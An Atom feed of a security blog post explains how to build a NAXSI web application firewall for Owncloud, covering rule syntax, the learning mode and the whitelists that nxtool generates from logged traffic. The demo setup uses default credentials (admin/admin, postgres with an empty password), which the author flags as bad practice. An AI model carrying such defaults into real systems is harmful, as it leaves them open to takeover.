<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>VulcanoSec Blog</title>
 <link href="http://vulcanosec.com/blog/atom.xml" rel="self"/>
 <link href="http://vulcanosec.com/blog/"/>
 <updated>2016-02-29T17:01:38+01:00</updated>
 <id>http://vulcanosec.com/blog</id>
 <author>
   <name>Dominik Richter</name>
   <email></email>
 </author>

 
 <entry>
   <title>Create a NAXSI WAF for Owncloud</title>
   <link href="http://vulcanosec.com/blog/article/create-a-naxsi-waf-for-owncloud"/>
   <updated>2016-02-17T20:00:00+01:00</updated>
   <id>http://vulcanosec.com/blog/article/create-a-naxsi-waf-for-owncloud</id>
   <content type="html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;A secure architecture of a web application consists of 3 components: a frontend, an application and a data backend. The frontend server’s task from a security perspective is to terminate SSL and to be the first line of defense. That means it inspects and validates requests from the untrusted outside world.&lt;/p&gt;

&lt;p&gt;Since 2011, the NAXSI module has become available, which quickly turns your nginx into a “Web Application Firewall” (WAF). Nginx with NAXSI can operate as a high-performance standalone WAF, if set up correctly.&lt;/p&gt;

&lt;p&gt;NAXSI can filter different values like URLs, request parameters, cookies, headers, and/or the body of HTTP requests. Those values can be filtered separately as well as in combination. The NAXSI module can be enabled or disabled per location within the Nginx configuration.&lt;/p&gt;

&lt;p&gt;NAXSI can be operated in two different modes: Live or learning. Some applications get very creative, with special characters encoded in cookies and other nasty tricks. This brings even experienced WAF admins quickly to the brink of insanity. The great learning feature in conjunction with automatic whitelisting puts you in the position to create WAF rules for any application and almost completely remove false-positives.&lt;/p&gt;

&lt;p&gt;This article explains how to create a WAF for owncloud. Both the application as well as the WAF are completely deployed with docker containers. The following picture shows the application design:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.vulcanosec.com/assets/article_images/2016-02-17-create-a-naxsi-waf-for-owncloud/design.png&quot; alt=&quot;Application Design&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;description-of-naxsi-approach&quot;&gt;Description of NAXSI Approach&lt;/h1&gt;

&lt;p&gt;NAXSI stands for “Nginx Anti Xss &amp;amp; Sql Injection”. NAXSI WAF detects unexpected characters in HTTP requests/arguments and blocks these. It prevents an attacker from leveraging web vulnerabilities of a site, no matter in which language the website is developed. It protects the website from the &lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project&quot;&gt;TOP 10 OWASP threats&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.vulcanosec.com/assets/article_images/2016-02-17-create-a-naxsi-waf-for-owncloud/principle.png&quot; alt=&quot;Principle&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The NXTOOL is helpful for the learning process. It writes all NAXSI events to elasticsearch. It also generates the whitelist.&lt;/p&gt;

&lt;p&gt;The learning process is needed to identify “false positives” and prevent them. Without this phase, we run into the risk that applications end up not running at all. If we allow too much, however, we leave a window of exploitation for an external attacker. As you can see, the learning process is critical to the WAF’s quality.&lt;/p&gt;

&lt;h1 id=&quot;description-of-naxsi-rules&quot;&gt;Description of NAXSI Rules&lt;/h1&gt;

&lt;p&gt;NAXSI rules have a straightforward design: They consit of three basic types of rules. The MainRule defines a detection-pattern and scores. The BasicRule defines whitelists for a MainRule. The CheckRule defines actions when a score is met.&lt;/p&gt;

&lt;h2 id=&quot;mainrule&quot;&gt;MainRule&lt;/h2&gt;

&lt;p&gt;MainRule is an identifier which marks detection-rules, unlike BasicRules, which are usually used to whitelist certain MainRules.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.vulcanosec.com/assets/article_images/2016-02-17-create-a-naxsi-waf-for-owncloud/mainrule.png&quot; alt=&quot;MainRule&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;match-pattern&quot;&gt;Match Pattern&lt;/h3&gt;

&lt;p&gt;The Match Pattern supports two formats:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;rx: regular expressions&lt;/li&gt;
  &lt;li&gt;str: string matcher&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;String matcher are faster than regular expressions, which makes them the preferred pattern. This example uses a regular expression to search for the keyword &lt;code&gt;select|from&lt;/code&gt; in the request.&lt;/p&gt;

&lt;h3 id=&quot;msg&quot;&gt;MSG&lt;/h3&gt;

&lt;p&gt;MSG is a human readable message and describes the pattern. This example includes the message &lt;code&gt;select and from sql keywords&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;match-zone&quot;&gt;Match Zone&lt;/h3&gt;

&lt;p&gt;Match zones defines which part of the request will be searched to find the specified pattern. This example rule searches in &lt;code&gt;BODY|URL|ARGS|$HEADERS_VAR:Cookie&lt;/code&gt;. With this simple expression, it is easy to target the whole body. This includes the complete content and every variable name in the body. It also searches in the URL and in the request ARGS, including the complete content and every name of variable in its arguments. &lt;code&gt;$HEADERS_VAR:Cookie&lt;/code&gt; means that NAXSI will also search in the HTTP “Cookie” header for the specified pattern.&lt;/p&gt;

&lt;h3 id=&quot;score-section&quot;&gt;Score Section&lt;/h3&gt;

&lt;p&gt;s is the score section. It is a “named” counter and will increase the &lt;code&gt;SQL&lt;/code&gt; counter by 4.&lt;/p&gt;

&lt;h3 id=&quot;id&quot;&gt;ID&lt;/h3&gt;

&lt;p&gt;id is the ID of the rule. This example has the ID &lt;code&gt;1000&lt;/code&gt;. Those IDs will be used in NAXSI_FMT and/or to whitelist this ID for a special request.&lt;/p&gt;

&lt;p&gt;Further reading: &lt;a href=&quot;https://github.com/nbs-system/naxsi/wiki/rulessyntax&quot;&gt;rules syntax&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;basicrule&quot;&gt;BasicRule&lt;/h2&gt;

&lt;p&gt;Basic Rules are used to create whitelists&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.vulcanosec.com/assets/article_images/2016-02-17-create-a-naxsi-waf-for-owncloud/basicrule.png&quot; alt=&quot;BasicRule&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;whitelist&quot;&gt;Whitelist&lt;/h3&gt;

&lt;p&gt;Which rule ID(s) are whitelisted. The example whitelists the rules 1011 and 1010 to allow special characters within the password field.&lt;/p&gt;

&lt;h3 id=&quot;match-zone-1&quot;&gt;Match Zone&lt;/h3&gt;

&lt;p&gt;Match zones defines which part of the request will be searched for the specified pattern (like for MainRules). This example rule searches in &lt;code&gt;$BODY_VAR:password&lt;/code&gt; for the specified pattern. &lt;code&gt;$BODY_VAR:password&lt;/code&gt; means NAXSI will search for the body variable named “password” for the specified pattern.&lt;/p&gt;

&lt;p&gt;Further reading &lt;a href=&quot;https://github.com/nbs-system/naxsi/wiki/whitelists&quot;&gt;whitelists&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;start-the-owncloud-and-create-naxsi-rules&quot;&gt;Start the owncloud and create NAXSI rules&lt;/h1&gt;

&lt;p&gt;First, we need to download the Project from &lt;a href=&quot;https://github.com/atomic111/example-NAXSI-owncloud.git&quot;&gt;github&lt;/a&gt; and just execute the &lt;code&gt;start.sh&lt;/code&gt; bash script. It creates the data volume container for the Postgres database and for the Owncloud application. It also creates the Postgres container with default user/passwords (user=postgres and empty password) and creates Owncloud itself with the default user/password (user = admin, password = admin). &lt;strong&gt;Not a good security practice. Sorry.&lt;/strong&gt; Let’s focus on creating the WAF for owncloud.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;start.sh&lt;/code&gt; also creates the image and container for the NAXSI WAF. The container starts the WAF in LEARNING MODE and elasticsearch to store NAXSI events.&lt;/p&gt;

&lt;p&gt;After the execution of &lt;code&gt;start.sh&lt;/code&gt; it should look like this.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;bash
∅&amp;gt; docker ps --format &quot;table :\t&quot;
NAMES                PORTS
owncloud-naxsi:      0.0.0.0:443-&amp;gt;443/tcp
elasticsearch:       0.0.0.0:9200-&amp;gt;9200/tcp, 0.0.0.0:9300-&amp;gt;9300/tcp
owncloud-nginx:      80/tcp
owncloud-postgres:   5432/tcp
&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;create-the-first-naxsi-rule&quot;&gt;Create the first NAXSI rule&lt;/h2&gt;

&lt;p&gt;Now the application is started and we have to browse the website to generate data in the logfile (&lt;code&gt;/var/log/nginx/naxsi_error.log&lt;/code&gt;). Log into owncloud via your browser (&lt;code&gt;https://127.0.0.1&lt;/code&gt;), upload a few pictures, create a folder, add a user, delete a file, delete a user, delete a group and click around. Create a lot of different events to prevent false-positives later on.&lt;/p&gt;

&lt;p&gt;To log into the WAF, run &lt;code&gt;docker exec -it owncloud-naxsi bash&lt;/code&gt; and add a nxapi index to the elasticsearch database with the following command:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;bash
curl -XPUT &#39;http://elasticsearch:9200/nxapi/&#39;
{&quot;acknowledged&quot;:true}
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Next, we need to load the data from the log file into ElasticSearch with the following command:&lt;/p&gt;

&lt;p&gt;```bash
nxtool.py -c /etc/nginx/nxapi.json –files=/var/log/nginx/naxsi_error.log
# size :1000
WARNING:root:List of files :[‘/var/log/nginx/naxsi_error.log’]
log open
{‘date’: ‘2016-02-16T14:29:33+00’, ‘events’: [{‘zone’: ‘HEADERS’, ‘ip’: ‘127.0.0.1’, ‘uri’: ‘/’, ‘server’: ‘127.0.0.1’, ‘content’: ‘’, ‘var_name’: ‘cookie’, ‘coords’: [104.195397, 35.86166], ‘country’: ‘CN’, ‘date’: ‘2016-02-16T14:29:33+00’, ‘id’: ‘1315’}]}
{‘date’: ‘2016-02-16T14:29:36+00’, ‘events’: [{‘zone’: ‘HEADERS’, ‘ip’: ‘127.0.0.1’, ‘uri’: ‘/index.php/apps/files/’, ‘server’: ‘127.0.0.1’, ‘content’: ‘’, ‘var_name’: ‘cookie’, ‘coords’: [104.195397, 35.86166], ‘country’: ‘CN’, ‘date’: ‘2016-02-16T14:29:36+00’, ‘id’: ‘1315’}]}&lt;/p&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;{‘date’: ‘2016-02-16T14:52:22+00’, ‘events’: [{‘zone’: ‘HEADERS’, ‘ip’: ‘127.0.0.1’, ‘uri’: ‘/index.php/heartbeat’, ‘server’: ‘127.0.0.1’, ‘content’: ‘’, ‘var_name’: ‘cookie’, ‘coords’: [104.195397, 35.86166], ‘country’: ‘CN’, ‘date’: ‘2016-02-16T14:52:22+00’, ‘id’: ‘1315’}, {‘zone’: ‘BODY’, ‘ip’: ‘127.0.0.1’, ‘uri’: ‘/index.php/heartbeat’, ‘server’: ‘127.0.0.1’, ‘content’: ‘’, ‘var_name’: ‘’, ‘coords’: [104.195397, 35.86166], ‘country’: ‘CN’, ‘date’: ‘2016-02-16T14:52:22+00’, ‘id’: ‘16’}]}
Written 710 events
root@18cecd3232a2:/opt#
```&lt;/p&gt;

&lt;p&gt;The following command displays the top servers which raised the most exceptions. Also the top URIs and zones which raised exceptions are shown. We need the URI list to generate the whitelists for specific requests.  &lt;/p&gt;

&lt;p&gt;&lt;code&gt;bash
nxtool.py -x -c /etc/nginx/nxapi.json
# size :1000
# Whitelist(ing) ratio :
# Top servers :
# 127.0.0.1 100.0% (total:710/710)
# Top URI(s) :
# /core/img/breadcrumb.svg 2.54% (total:18/710)
# /index.php/core/ajax/appconfig.php 2.39% (total:17/710)
# /index.php/settings/users/users 2.39% (total:17/710)
# /cron.php 2.25% (total:16/710)
# /index.php/core/js/oc.js 2.25% (total:16/710)
# /index.php/apps/notifications 2.11% (total:15/710)
# /index.php/avatar/admin/128 2.11% (total:15/710)
# /index.php/core/ajax/share.php 1.69% (total:12/710)
# /index.php/apps/files/ajax/getstoragestats.php 1.55% (total:11/710)
# /index.php/settings/users/groups 1.27% (total:9/710)
# /index.php/apps/files/ajax/upload.php 1.13% (total:8/710)
# Top Zone(s) :
# HEADERS 95.07% (total:675/710)
# URL 2.82% (total:20/710)
# BODY 1.69% (total:12/710)
# BODY|NAME 0.28% (total:2/710)
# ARGS 0.14% (total:1/710)
# Top Peer(s) :
# 127.0.0.1 100.0% (total:710/710)
root@18cecd3232a2:/opt#
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now generate a whitelist for the first URI and save the &lt;code&gt;BasicRule  wl:1315 &quot;mz:$HEADERS_VAR:cookie&quot;;&lt;/code&gt; in the &lt;code&gt;naxsi_whitelist.rules&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;```bash
nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -f –filter ‘uri /core/img/breadcrumb.svg’ –slack
# size :1000
#  template :/usr/local/nxapi/tpl/HEADERS/cookies.tpl
Nb of hits : 106
#  template matched, generating all rules.
1 whitelists …
#Rule (1315) double encoding !
#total hits 106
#peers : 127.0.0.1
#uri : /core/img/breadcrumb.svg
#var_name : cookie&lt;/p&gt;

&lt;p&gt;BasicRule  wl:1315 “mz:$HEADERS_VAR:cookie”;
#  template :/usr/local/nxapi/tpl/BODY/url-wide-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/BODY/url-wide-id-BODY-NAME.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/BODY/precise-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/BODY/var_name-wide-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/BODY/site-wide-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/ARGS/url-wide-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/ARGS/url-wide-id-NAME.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/ARGS/precise-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/ARGS/site-wide-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/APPS/google_analytics-ARGS.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/URI/url-wide-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/URI/global-url-0x_in_pircutres.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/URI/site-wide-id.tpl
Nb of hits : 0
root@18cecd3232a2:/opt#
&lt;code&gt;
&lt;/code&gt;bash
echo “BasicRule  wl:1315 &quot;mz:$HEADERS_VAR:cookie&quot;;” &amp;gt; /etc/nginx/naxsi_whitelist.rules&lt;br /&gt;
```&lt;/p&gt;

&lt;p&gt;Now tag the request with the corresponding rule inside elasticsearch.&lt;/p&gt;

&lt;p&gt;```bash
nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -w /etc/nginx/naxsi_whitelist.rules –tag       &lt;br /&gt;
# size :1000
#Loading tpl ‘/etc/nginx/naxsi_whitelist.rules’
TAG RULE :{‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
                             {‘match’: {‘zone’: ‘HEADERS’}},
                             {‘match’: {‘var_name’: ‘cookie’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
5151 items to be tagged …
Tagged 515 events out of 5151
Tagged 1030 events out of 5151
Tagged 1545 events out of 5151
Tagged 2060 events out of 5151
Tagged 2575 events out of 5151
Tagged 3090 events out of 5151
Tagged 3605 events out of 5151
Tagged 4120 events out of 5151
Tagged 4635 events out of 5151
Tagged 5150 events out of 5151
Tagged 5151 events out of 5151&lt;/p&gt;

&lt;p&gt;TAG RULE :{‘from’: 0,
 ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
                             {‘match’: {‘zone’: ‘HEADERS’}},
                             {‘match’: {‘var_name’: ‘cookie’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
178 items to be tagged …
Tagged 17 events out of 178
Tagged 34 events out of 178
Tagged 51 events out of 178
Tagged 68 events out of 178
Tagged 85 events out of 178
Tagged 102 events out of 178
Tagged 119 events out of 178
Tagged 136 events out of 178
Tagged 153 events out of 178
Tagged 170 events out of 178
Tagged 178 events out of 178&lt;/p&gt;

&lt;p&gt;TAG RULE :{‘from’: 0,
 ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
                             {‘match’: {‘zone’: ‘HEADERS’}},
                             {‘match’: {‘var_name’: ‘cookie’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
123 items to be tagged …
Tagged 12 events out of 123
Tagged 24 events out of 123
Tagged 36 events out of 123
Tagged 48 events out of 123
Tagged 60 events out of 123
Tagged 72 events out of 123
Tagged 84 events out of 123
Tagged 96 events out of 123
Tagged 108 events out of 123
Tagged 120 events out of 123
Tagged 123 events out of 123&lt;/p&gt;

&lt;p&gt;TAG RULE :{‘from’: 0,
 ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
                             {‘match’: {‘zone’: ‘HEADERS’}},
                             {‘match’: {‘var_name’: ‘cookie’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
99 items to be tagged …
Tagged 99 events out of 99&lt;/p&gt;

&lt;p&gt;TAG RULE :{‘from’: 0,
 ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
                             {‘match’: {‘zone’: ‘HEADERS’}},
                             {‘match’: {‘var_name’: ‘cookie’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
49 items to be tagged …
Tagged 49 events out of 49&lt;/p&gt;

&lt;p&gt;TAG RULE :{‘from’: 0,
 ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
                             {‘match’: {‘zone’: ‘HEADERS’}},
                             {‘match’: {‘var_name’: ‘cookie’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
0 items to be tagged …&lt;/p&gt;

&lt;p&gt;5600 items tagged …
```&lt;/p&gt;

&lt;p&gt;When you look to the report again, it will confirm, that the number of requests decreased&lt;/p&gt;

&lt;p&gt;&lt;code&gt;bash
nxtool.py -x -c /etc/nginx/nxapi.json -s 127.0.0.1
# size :1000
# Whitelist(ing) ratio :
# Top servers :
# 127.0.0.1 100.0% (total:424/424)
# Top URI(s) :
# /index.php/apps/files/ajax/upload.php 10.38% (total:44/424)
# /index.php/heartbeat 8.02% (total:34/424)
# /index.php/apps/files/ajax/delete.php 5.66% (total:24/424)
# /index.php/avatar/cropped 5.66% (total:24/424)
# /index.php/core/ajax/share.php 5.66% (total:24/424)
# /index.php/apps/gallery/files/list 4.95% (total:21/424)
# /index.php/core/ajax/appconfig.php 4.25% (total:18/424)
# /index.php/settings/apps/list 4.25% (total:18/424)
# /index.php/apps/files_trashbin/ajax/delete.php 3.77% (total:16/424)
# /core/css/multiselect.css 3.54% (total:15/424)
# /index.php/apps/gallery/thumbnails 3.54% (total:15/424)
# Top Zone(s) :
# URL 41.27% (total:175/424)
# BODY 30.42% (total:129/424)
# BODY|NAME 13.68% (total:58/424)
# ARGS 8.49% (total:36/424)
# ARGS|NAME 6.13% (total:26/424)
# Top Peer(s) :
# 127.0.0.1 100.0% (total:424/424)
&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;create-the-second-naxsi-rule&quot;&gt;Create the second NAXSI rule&lt;/h2&gt;

&lt;p&gt;```bash
nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -f –filter ‘uri /index.php/apps/files/ajax/upload.php’ –slack
# size :1000
#  template :/usr/local/nxapi/tpl/HEADERS/cookies.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/BODY/url-wide-id.tpl
Nb of hits : 44
#  template matched, generating all rules.
1 whitelists …
#msg: A generic whitelist, true for the whole uri
#Rule (2) request too big, stored on disk and not parsed
#total hits 44
#peers : 127.0.0.1
#uri : /index.php/apps/files/ajax/upload.php&lt;/p&gt;

&lt;p&gt;BasicRule  wl:2 “mz:$URL:/index.php/apps/files/ajax/upload.php|BODY”;
#  template :/usr/local/nxapi/tpl/BODY/url-wide-id-BODY-NAME.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/BODY/precise-id.tpl
Nb of hits : 44
#  template matched, generating all rules.
1 whitelists …
#msg: A generic, precise wl tpl (url+var+id)
#Rule (2) request too big, stored on disk and not parsed
#total hits 44
#peers : 127.0.0.1
#uri : /index.php/apps/files/ajax/upload.php&lt;/p&gt;

&lt;p&gt;BasicRule  wl:2 “mz:$URL:/index.php/apps/files/ajax/upload.php|BODY”;
#  template :/usr/local/nxapi/tpl/BODY/var_name-wide-id.tpl
Nb of hits : 44
#  template matched, generating all rules.
1 whitelists …
#msg: A generic rule to spot var-name specific WL
#Rule (2) request too big, stored on disk and not parsed
#total hits 44
#peers : 127.0.0.1
#uri : /index.php/apps/files/ajax/upload.php&lt;/p&gt;

&lt;p&gt;BasicRule  wl:2 “mz:BODY”;
#  template :/usr/local/nxapi/tpl/BODY/site-wide-id.tpl
Nb of hits : 44
#  template matched, generating all rules.
1 whitelists …
#msg: A generic, wide (id+zone) wl
#Rule (2) request too big, stored on disk and not parsed
#total hits 44
#peers : 127.0.0.1
#uri : /index.php/apps/files/ajax/upload.php&lt;/p&gt;

&lt;p&gt;BasicRule  wl:2 “mz:BODY”;
#  template :/usr/local/nxapi/tpl/ARGS/url-wide-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/ARGS/url-wide-id-NAME.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/ARGS/precise-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/ARGS/site-wide-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/APPS/google_analytics-ARGS.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/URI/url-wide-id.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/URI/global-url-0x_in_pircutres.tpl
Nb of hits : 0
#  template :/usr/local/nxapi/tpl/URI/site-wide-id.tpl
Nb of hits : 0
root@18cecd3232a2:/opt#
```&lt;/p&gt;

&lt;p&gt;NXTOOL creates some rules for the same URI. The Main rule 2 protects against request which are to big and won´t be parsed. If we choose the &lt;code&gt;BasicRule  wl:2 &quot;mz:BODY&quot;;&lt;/code&gt;, we would allow for big requests on all URIs. That is not what we want. Instead, I recommend the &lt;code&gt;BasicRule  wl:2 &quot;mz:$URL:/index.php/apps/files/ajax/upload.php|BODY&quot;;&lt;/code&gt; because this rules allows only big requests for a specific URI.&lt;/p&gt;

&lt;p&gt;Save the rule in the &lt;code&gt;naxsi_whitelist.rules&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;bash
echo &quot;BasicRule  wl:2 \&quot;mz:\$URL:/index.php/apps/files/ajax/upload.php\|BODY\&quot;;&quot; &amp;gt;&amp;gt; /etc/nginx/naxsi_whitelist.rules
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Tag the request with the corresponding rule within elasticsearch.&lt;/p&gt;

&lt;p&gt;```bash
nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -w /etc/nginx/naxsi_whitelist.rules –tag                        &lt;br /&gt;
# size :1000
#Loading tpl ‘/etc/nginx/naxsi_whitelist.rules’
TAG RULE :{‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
                             {‘match’: {‘zone’: ‘HEADERS’}},
                             {‘match’: {‘var_name’: ‘cookie’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
0 items to be tagged …&lt;/p&gt;

&lt;p&gt;TAG RULE :{‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘2’}},
                             {‘match’: {‘uri’: ‘/index.php/apps/files/ajax/upload.php’}},
                             {‘match’: {‘zone’: ‘BODY’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
44 items to be tagged …
Tagged 44 events out of 44&lt;/p&gt;

&lt;p&gt;TAG RULE :{‘from’: 0,
 ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘2’}},
                             {‘match’: {‘uri’: ‘/index.php/apps/files/ajax/upload.php’}},
                             {‘match’: {‘zone’: ‘BODY’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
44 items to be tagged …
Tagged 44 events out of 44&lt;/p&gt;

&lt;p&gt;TAG RULE :{‘from’: 0,
 ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘2’}},
                             {‘match’: {‘uri’: ‘/index.php/apps/files/ajax/upload.php’}},
                             {‘match’: {‘zone’: ‘BODY’}},
                             {‘match’: {u’whitelisted’: u’false’}},
                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
 ‘size’: ‘0’}
0 items to be tagged …&lt;/p&gt;

&lt;p&gt;88 items tagged …
root@18cecd3232a2:/opt#
```&lt;/p&gt;

&lt;p&gt;Repeat these steps for all other requests until you get a complete whitelist similar to this:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;
BasicRule  wl:1000 &quot;mz:$URL:/apps/activity/img/delete-color.svg|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/apps/files/img/delete.svg|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/apps/updater/css/updater.css|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/apps/updater/img/app.svg|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/apps/updater/js/3rdparty/angular.js|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/apps/updater/js/updater.js|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/apps/updater/l10n/de_DE.js|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/core/css/multiselect.css|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/core/img/actions/delete-hover.svg|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/core/img/actions/delete.svg|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/core/js/multiselect.js|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/core/js/singleselect.js|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/core/vendor/select2/select2-spinner.gif|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/core/vendor/select2/select2.css|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/core/vendor/select2/select2.js|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/core/vendor/select2/select2.png|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/index.php/apps/activity/settings|BODY|NAME&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/index.php/apps/files/ajax/delete.php|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/index.php/apps/files_trashbin/ajax/delete.php|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/index.php/apps/files_trashbin/ajax/undelete.php|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/index.php/apps/updater/backup/index|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/index.php/settings/apps/list|ARGS|NAME&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/settings/js/users/deleteHandler.js|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/settings/js/users/deleteHandler.js|URL&quot;;
BasicRule  wl:1000 &quot;mz:$URL:/index.php/apps/files/ajax/scan.php|$ARGS_VAR:requesttoken&quot;;
BasicRule  wl:1001,1310,1311 &quot;mz:$URL:/index.php/apps/files/ajax/delete.php|$BODY_VAR:files&quot;;
BasicRule  wl:1001,1310,1311 &quot;mz:$URL:/index.php/apps/files_trashbin/ajax/delete.php|$BODY_VAR:files&quot;;
BasicRule  wl:1001,1310,1311 &quot;mz:$URL:/index.php/apps/files_trashbin/ajax/undelete.php|$BODY_VAR:files&quot;;
BasicRule  wl:1001,1310,1311 &quot;mz:$URL:/index.php/core/ajax/appconfig.php|$BODY_VAR:value&quot;;
BasicRule  wl:1002 &quot;mz:$URL_X:/core/css/images|URL&quot;;
BasicRule  wl:1002 &quot;mz:$URL:/index.php/core/preview.png|$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1002 &quot;mz:$URL:/index.php/core/ajax/appconfig.php|$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1002 &quot;mz:$URL:/index.php/core/ajax/share.php|$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1002 &quot;mz:$URL:/index.php/core/js/oc.js|$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1002 &quot;mz:$URL:/core/img/breadcrumb.svg|$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1002 &quot;mz:$URL:/index.php/apps/notifications|$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1002 &quot;mz:$URL_X:/index.php/avatar|$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1002 &quot;mz:$URL_X:/index.php/apps/files_trashbin/ajax|$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1002 &quot;mz:$URL:/index.php/apps/files/ajax/getstoragestats.php|$HEADERS_VAR:cookie&quot;;
BasicRule  wl:1002 &quot;mz:$URL:/cron.php|$HEADERS_VAR:cookie&quot;;
